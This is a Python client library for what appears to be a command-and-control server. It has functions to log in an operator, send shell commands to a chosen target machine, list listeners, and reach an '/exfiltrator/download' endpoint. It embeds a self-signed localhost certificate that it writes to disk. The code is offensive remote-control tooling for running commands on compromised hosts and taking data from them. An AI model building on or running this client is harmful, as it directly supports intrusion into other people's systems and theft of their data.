import requests
import json
from enum import Enum
from modelmapper import *

class ApiExecCode(Enum):
    Success = 0 
    Fail = 1
    Error = 2
    InvalidID = 3

class HttpClient():

    def __init__(self, api_url) -> None:
        self.api_url = api_url
        self.std_timeout = 20 # all requests timeout after 15s

    def set_timeout(self, timeout):
        self.std_timeout = timeout

    def api_authenticate(self, email, password):

        parameters = [ parameter("email", email), parameter("password", password)]

        try:
            self.export_ssl_certificate()
            httpResponse = requests.post(url= self.endpointOf("auth"), data=json.dumps(parameters), verify=".api_certificate.cer", 
                                         headers={"Content-type": "application/json"}, timeout=self.std_timeout)
            
            
            if(httpResponse.status_code == 200):
                response = httpResponse.json()
                
                success = ApiExecCode(response["code"]) == ApiExecCode.Success
                return success, response["data"]
                
            else:
                print(f"Authentication failed with status {httpResponse.status_code}.")
        
        except requests.Timeout:
            print("Authentication timed out.")

        except Exception as ex:
            print("Unexpected error upon authentication attempt.")


        return False, None

    def api_submit_cmd(self, session_token, target_id, is_shell, command_str):
        cmd = command(session_token, target_id, is_shell, command_str)

        try:
            self.export_ssl_certificate()
            httpResponse = requests.post(url= self.endpointOf("submit_cmd"), data=json.dumps(cmd), verify=".api_certificate.cer", 
                                         headers={"Content-type": "application/json"}, timeout=self.std_timeout)
            
            if httpResponse.status_code == 200:
                cmdResult = httpResponse.json()

                return cmdResult["resultString"]
            else:
                print(f"Command submit failed with status {httpResponse.status_code}.")
        
        except requests.Timeout:
            print("Command timed out.")

        except Exception as ex:
            print("Unexpected error while submitting command.")

        return None
    
    def api_get_listeners(self, session_token):
        token = parameter("sessionId", session_token)

        try:
            self.export_ssl_certificate()
            httpResponse = requests.post(url= self.endpointOf("listeners"), data= json.dumps(token), verify=".api_certificate.cer", 
                                         headers={"Content-type": "application/json"}, timeout=self.std_timeout)

            if httpResponse.status_code == 200:
                response = httpResponse.json()

                return response
            else:
                print(f"Fetching list of listeners failed with status {httpResponse.status_code}.")

        except requests.Timeout:
            print("Timed out.")

        except Exception as ex:
            print("Unexpected error while fetching listeners.")

        return []
    
    def export_ssl_certificate(self):
        ssl_certificate = "-----BEGIN CERTIFICATE-----\n"
        ssl_certificate+= "MIIDDDCCAfSgAwIBAgIIInFUpTLFJpEwDQYJKoZIhvcNAQELBQAwFDESMBAGA1UE\n"
        ssl_certificate+= "AxMJbG9jYWxob3N0MB4XDTIzMDgxNzEyNTkzNVoXDTI0MDgxNzEyNTkzNVowFDES\n"
        ssl_certificate+= "MBAGA1UEAxMJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC\n"
        ssl_certificate+= "AQEAv6SCUBmWenuBe+2EvqxJGADO2hDNrDWmvgtidr/xKcSAUjDuOl+WMzGNYsiw\n"
        ssl_certificate+= "I944Nzgy1yD+Nx1Z+D7o2GP7nqKrk/5YB5syoDWbeh6HMHyJTVN18/ukF7zUB3SK\n"
        ssl_certificate+= "6QCZjG6zEsNe/yLmy7yhWkLDE8HHd4Qt49F06Bikxq3kUKuHuvs4MQS9a848lEY2\n"
        ssl_certificate+= "rZeSlD+KdzkWodmj1xifB6QA5EKZnJ/VKgVyI11Rb3r8WYSr2kdQ1xqJULiA90yE\n"
        ssl_certificate+= "ooePqvNYMfH99ReVAJDs32JENPhOeT6LF6NdXY14cqT05cjvafpel2lEMZaIPD/I\n"
        ssl_certificate+= "Hby0C099gSyFhEIe2/VrgeK4FQIDAQABo2IwYDAMBgNVHRMBAf8EAjAAMA4GA1Ud\n"
        ssl_certificate+= "DwEB/wQEAwIFoDAWBgNVHSUBAf8EDDAKBggrBgEFBQcDATAXBgNVHREBAf8EDTAL\n"
        ssl_certificate+= "gglsb2NhbGhvc3QwDwYKKwYBBAGCN1QBAQQBAjANBgkqhkiG9w0BAQsFAAOCAQEA\n"
        ssl_certificate+= "Bh6yoCNaO+hbAHgNE6hapHGpnWPeK3lbGDujnurkcQz69zz5XgmF4shhJmyzwnfl\n"
        ssl_certificate+= "7oWFQN/SznersKwj5kQUA20gXRIJF6ZfykZoUSUesyaz5SWqJ4SjrbnmalXF+fTN\n"
        ssl_certificate+= "0G7wEsrZwfq9CqweCS/y3KXBePGJiD5azvoDNZIqu9etpxol4U4vb3uOCS3bo+zN\n"
        ssl_certificate+= "ZA7plBOqM1mgkXLu5ZUbc/DYmbc0td7hYuQdW9SZXGoEJfYN2olHfvfHUVDrjfVn\n"
        ssl_certificate+= "wfmYU6nIo8P4UROsCFEM9J6RF63FasAX0fYJeUjknfhQtaMAm+OAMkGCRQaWjJJT\n"
        ssl_certificate+= "QeFaSpwl31XUYFqgktwX5A==\n"
        ssl_certificate+= "-----END CERTIFICATE-----\n"

        try:
            with open(".api_certificate.cer", "w") as certificate:
                certificate.write(ssl_certificate)
                certificate.flush()

        except Exception:
            print("Failed to export ssl certificate. Check permissions and try again.")
        

    def endpointOf(self, name):
        api_endpoints = {
            "auth": "/accountManager/auth",
            "submit_cmd": "/cmdInterpreter/submit",
            "listeners": "/cmdInterpreter/listeners",
            "download": "/exfiltrator/download"
        }
        
        return f"{self.api_url}{api_endpoints[name]}"
